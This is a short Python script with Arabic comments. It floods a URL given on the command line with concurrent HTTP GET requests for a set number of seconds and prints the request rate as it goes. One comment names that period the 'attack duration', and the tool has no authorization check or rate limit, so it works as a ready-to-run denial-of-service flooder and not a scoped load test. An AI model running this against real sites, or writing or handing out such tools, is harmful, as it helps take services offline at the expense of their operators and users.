import asyncio
import aiohttp
import os
import sys

sent = 0

async def worker(session, url):
    global sent
    while True:
        try:
            async with session.get(url):
                sent += 1
        except:
            pass

async def monitor():
    global sent
    old = 0
    while True:
        await asyncio.sleep(1)
        rps = sent - old
        old = sent
        print(f"[RPS: {rps}]  Total: {sent}")

async def main():
    global sent

    # التحقق من المدخلات عبر سطر الأوامر
    if len(sys.argv) < 4:
        print("Usage: python3 main.py <URL> <THREADS> <TIME>")
        print("Example: python3 main.py https://test.com 1000 60")
        return

    url = sys.argv[1]
    
    try:
        connections = int(sys.argv[2])
        duration = int(sys.argv[3])
    except ValueError:
        print("Error: Threads and Time must be integers.")
        return

    print(f"Target URL      : {url}")
    print(f"Using Workers   : {connections}")
    print(f"Duration        : {duration} seconds")
    
    # عرض عدد الأنوية (معلومة إضافية)
    cores = os.cpu_count()
    print(f"Detected CPU Cores: {cores}\n")

    async with aiohttp.ClientSession() as session:
        tasks = []

        # تشغيل العمال (Workers)
        for _ in range(connections):
            tasks.append(asyncio.create_task(worker(session, url)))

        # تشغيل المراقبة
        monitor_task = asyncio.create_task(monitor())

        # الانتظار لمدة محددة (مدة الهجوم)
        print(f"Started... running for {duration}s")
        await asyncio.sleep(duration)

        # إيقاف العملية بعد انتهاء الوقت
        print("\nTime is up! Stopping tasks...")
        for task in tasks:
            task.cancel()
        monitor_task.cancel()
        
        # التأكد من إغلاق كل شيء
        await asyncio.gather(*tasks, monitor_task, return_exceptions=True)
        print(f"Finished. Final Requests Sent: {sent}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nStopped by user.")
